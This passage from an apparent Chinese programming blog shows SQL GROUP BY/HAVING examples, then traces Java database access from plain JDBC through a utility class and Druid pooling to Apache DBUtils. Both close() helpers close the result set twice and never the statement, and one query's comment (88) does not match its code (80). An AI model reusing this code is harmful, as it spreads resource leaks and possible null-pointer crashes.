    <span class="token identifier"><span class="token punctuation">`</span>birth<span class="token punctuation">`</span></span> <span class="token keyword">date</span>        <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'出生日期'</span><span class="token punctuation">,</span>
    <span class="token identifier"><span class="token punctuation">`</span>sex<span class="token punctuation">`</span></span>   <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    <span class="token identifier"><span class="token punctuation">`</span>age<span class="token punctuation">`</span></span>   <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>     <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    <span class="token identifier"><span class="token punctuation">`</span>score<span class="token punctuation">`</span></span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>     <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># 插入数据</span>
<span class="token keyword">insert</span> <span class="token keyword">into</span> student1
<span class="token keyword">values</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Tom'</span><span class="token punctuation">,</span> <span class="token string">'1998-10-01'</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
       <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Jim'</span><span class="token punctuation">,</span> <span class="token string">'1997-07-04'</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
       <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'Lily'</span><span class="token punctuation">,</span> <span class="token string">'1999-11-12'</span><span class="token punctuation">,</span> <span class="token string">'女'</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
       <span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'Lilei'</span><span class="token punctuation">,</span> <span class="token string">'1996-09-21'</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
       <span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'Lucy'</span><span class="token punctuation">,</span> <span class="token string">'1999-12-02'</span><span class="token punctuation">,</span> <span class="token string">'女'</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
       <span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'Jack'</span><span class="token punctuation">,</span> <span class="token string">'1988-04-27'</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
       <span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'Liam'</span><span class="token punctuation">,</span> <span class="token string">'1991-09-08'</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       
<span class="token comment"># 查询数据</span>
<span class="token comment">## 1. 看男女各自的最高分</span>
<span class="token keyword">select</span> sex<span class="token punctuation">,</span> <span class="token function">max</span><span class="token punctuation">(</span>score<span class="token punctuation">)</span> <span class="token keyword">as</span> maxScore
<span class="token keyword">from</span> student1
<span class="token keyword">group</span> <span class="token keyword">by</span> sex<span class="token punctuation">;</span>

<span class="token comment">## 2. 查看男女最高分中大于99的组数据（需要先分组，再从分组后的数据中挑选合适的）</span>
<span class="token keyword">select</span> sex<span class="token punctuation">,</span> <span class="token function">max</span><span class="token punctuation">(</span>score<span class="token punctuation">)</span> <span class="token keyword">as</span> maxScore
<span class="token keyword">from</span> student1
<span class="token keyword">group</span> <span class="token keyword">by</span> sex
<span class="token keyword">having</span> maxScore <span class="token operator">></span> <span class="token number">99</span>

<span class="token comment">## 3. 在年龄小于25岁的学生里，看男女最高分中大于88的组数据 (先按照where条件筛选，然后进行分组，分组后再按照having筛选)</span>
<span class="token keyword">select</span> sex<span class="token punctuation">,</span> <span class="token function">max</span><span class="token punctuation">(</span>score<span class="token punctuation">)</span> <span class="token keyword">as</span> maxScore
<span class="token keyword">from</span> student1
<span class="token keyword">where</span> age <span class="token operator">&lt;</span> <span class="token number">25</span>
<span class="token keyword">group</span> <span class="token keyword">by</span> sex
<span class="token keyword">having</span> maxScore <span class="token operator">></span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>从 JDBC 到 ORM（例：Mybatis）</title>
    <url>//post/%E6%95%B0%E6%8D%AE%E5%BA%93/%E4%BB%8E%20JDBC%20%E5%88%B0%20ORM%EF%BC%88%E4%BE%8B%EF%BC%9AMybatis%EF%BC%89%E7%9A%84%E6%BC%94%E5%8C%96%E8%BF%87%E7%A8%8B.html</url>
    <content><![CDATA[<h1 id="从-JDBC-到-ORM（例：Mybatis）的演化过程"><a href="#从-JDBC-到-ORM（例：Mybatis）的演化过程" class="headerlink" title="从 JDBC 到 ORM（例：Mybatis）的演化过程"></a>从 JDBC 到 ORM（例：Mybatis）的演化过程</h1><p>​    下面我将介绍Java操作Mysql数据的方式的演化过程，从最基本的JDBC到ORM框架的实现，每一次演化都是为了解决现有存在的问题。</p>
<h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><p>这里需要加入Mysql驱动包或者依赖.</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>mysql<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>mysql-connector-java<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>8.0.13<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 注册驱动</span>
    <span class="token class-name">Driver</span> driver <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>mysql<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span></span>Driver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 设置配置</span>
    <span class="token class-name">Properties</span> properties <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    properties<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    properties<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span><span class="token string">"123456"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">"jdbc:mysql://localhost:3306/orm"</span><span class="token punctuation">;</span>
    <span class="token comment">// 获取连接</span>
    <span class="token class-name">Connection</span> connect <span class="token operator">=</span> driver<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> properties<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 执行SQL</span>
    <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from user"</span><span class="token punctuation">;</span>
    <span class="token class-name">Statement</span> statement <span class="token operator">=</span> connect<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 返回结果</span>
    <span class="token class-name">ResultSet</span> resultSet <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 结束资源</span>
    resultSet<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    statement<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    connect<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    可以看到我们是通过<code>Statement</code>去执行的SQL语句，这里是存在SQL注入风险的，简单来说就是SQL是字符串拼接的，如果有恶意参数，会影响整个SQL的意思，所以后面我们使用<code>PreparedStatement </code>，也叫做预处理，执行SQL语句的参数用<code>(?)</code>来表示,使用set方法插入值。好处：1. 防止SQL注入 2. 减少编译次数，效率高 3. 不在使用SQL拼接，减少语法错误。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 注册驱动</span>
    <span class="token class-name">Driver</span> driver <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>mysql<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span></span>Driver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 设置配置</span>
    <span class="token class-name">Properties</span> properties <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    properties<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    properties<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span><span class="token string">"123456"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">"jdbc:mysql://localhost:3306/orm"</span><span class="token punctuation">;</span>
    <span class="token comment">// 获取连接</span>
    <span class="token class-name">Connection</span> connect <span class="token operator">=</span> driver<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> properties<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 执行SQL</span>
    <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from user where username =?"</span><span class="token punctuation">;</span>
    <span class="token class-name">PreparedStatement</span> statement <span class="token operator">=</span> connect<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
    statement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"steak"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 返回结果</span>
    <span class="token class-name">ResultSet</span> resultSet <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 结束资源</span>
    resultSet<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    statement<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    connect<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="封装JDBC工具类"><a href="#封装JDBC工具类" class="headerlink" title="封装JDBC工具类"></a>封装JDBC工具类</h2><p>​    上面的操作，其中资源配置都是固定操作，所以我们可以直接写一个工具类来每次获取连接，进行操作，释放资源。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JDBCUtils</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> password<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> url<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> driver<span class="token punctuation">;</span>

    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Properties</span> properties <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 将配置写入配置文件，更加灵活</span>
            properties<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"src\\mysql.properties"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            username <span class="token operator">=</span> properties<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            password <span class="token operator">=</span> properties<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            url <span class="token operator">=</span> properties<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            driver <span class="token operator">=</span> properties<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"driver"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Connection</span> <span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SQLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token class-name">ResultSet</span> set<span class="token punctuation">,</span> <span class="token class-name">Statement</span> statement<span class="token punctuation">,</span> <span class="token class-name">Connection</span> connection<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>set <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            set<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>statement <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            set<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>connection <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            connection<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="使用连接池"><a href="#使用连接池" class="headerlink" title="使用连接池"></a>使用连接池</h2><p>​    在上面我们每次操作数据库时，都是获取连接，操作，断开连接。</p>
<p>​    传统的JDBC操作会频繁的请求和验证，占用很多系统资源，导致服务崩溃，如果程序出现问题未能正常关闭，将导致数据库内存泄露，组织共导致重启数据库。</p>
<p>​    而且不能控制连接的数量，如果连接过多，可能导致Mysql崩溃。所以我们引入了连接池，让连接复用。这里我使用德鲁伊连接池，只用引入先关依赖即可：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>druid<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>这里我直接把原先的获取连接方式，改为使用连接池获取。</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>druid<span class="token punctuation">.</span>pool<span class="token punctuation">.</span></span><span class="token class-name">DruidDataSourceFactory</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">DataSource</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JDBCUtils</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">DataSource</span> dataSource<span class="token punctuation">;</span>
    
    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Properties</span> properties <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 将配置写入配置文件</span>
            properties<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"src\\mysql.properties"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            dataSource <span class="token operator">=</span> <span class="token class-name">DruidDataSourceFactory</span><span class="token punctuation">.</span><span class="token function">createDataSource</span><span class="token punctuation">(</span>properties<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Connection</span> <span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> dataSource<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SQLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token class-name">ResultSet</span> set<span class="token punctuation">,</span> <span class="token class-name">Statement</span> statement<span class="token punctuation">,</span> <span class="token class-name">Connection</span> connection<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>set <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            set<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>statement <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            set<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// 在数据库连接池技术中，close 不是真的断掉连接，而是把使用的 Connection 对象放回连接池</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>connection <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            connection<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Apache—DBUtils"><a href="#Apache—DBUtils" class="headerlink" title="Apache—DBUtils"></a>Apache—DBUtils</h2><p>​    上面的操作存在一个问题，关闭connection之后，resultSet结果集无法使用，且resultSet不利于数据的管理，所以每次我们查询了数据，可以手动的添加到List，Map等容器使用。还存在一个问题，每次查询返回的都是ResultSet，能不能通过泛型和反射，直接将数据封装成对象或者到List中。这些操作就被<code>Apache—DBUtils</code>完成了，是Apache提供的开源JDBC工具类库，且内部对SQL执行进行了线程安全保证。</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-dbutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
